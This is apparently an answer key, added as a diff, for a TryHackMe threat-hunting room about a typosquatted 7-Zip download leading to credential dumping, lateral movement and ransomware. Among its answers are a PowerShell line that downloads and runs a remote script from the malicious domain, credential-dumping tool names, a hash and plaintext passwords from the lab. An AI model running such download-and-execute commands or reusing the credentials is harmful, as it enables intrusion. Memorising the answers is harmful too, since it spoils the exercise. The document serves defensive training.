@@ -1,0 +1,47 @@
+Hunt Me II: Typo Squatters
+https://tryhackme.com/room/typosquatters
+
+What is the URL of the malicious software that was downloaded by the victim user?
+http://www.7zipp.org/a/7z2301-x64.msi
+
+What is the IP address of the domain hosting the malware?
+206.189.34.218
+
+What is the PID of the process that executed the malicious software?
+2532
+
+Following the execution chain of the malicious payload, another remote file was downloaded and executed. What is the full command line value of this suspicious activity?
+powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)
+
+The newly downloaded script also installed the legitimate version of the application. What is the full file path of the legitimate installer?
+C:\Windows\Temp\7zlegit.exe
+
+What is the name of the service that was installed?
+7zService
+
+The attacker was able to establish a C2 connection after starting the implanted service. What is the username of the account that executed the service?
+SYSTEM
+
+After dumping LSASS data, the attacker attempted to parse the data to harvest the credentials. What is the name of the tool used by the attacker in this activity?
+Invoke-PowerExtract
+
+What is the credential pair that the attacker leveraged after the credential dumping activity? (format: username:hash)
+james.cromwell:B852A0B8BD4E00564128E0A5EA2BC4CF
+
+After gaining access to the new account, the attacker attempted to reset the credentials of another user. What is the new password set to this target account?
+pwn3dpw!!!
+
+What is the name of the workstation where the new account was used?
+WKSTN-02
+
+After gaining access to the new workstation, a new set of credentials was discovered. What is the username, including its domain, and password of this new account?
+SSF\itadmin:NoO6@39Sk0!
+
+Aside from mimikatz, what is the name of the PowerShell script used to dump the hash of the domain admin?
+Invoke-SharpKatz.ps1
+
+What is the AES256 hash of the domain admin based on the credential dumping output?
+f28a16b8d3f5163cb7a7f7ed2c8f2cf0419f0b0c2e28c15f831d050f5edaa534
+
+After gaining domain admin access, the attacker popped ransomware on workstations. How many files were encrypted on all workstations?
+46
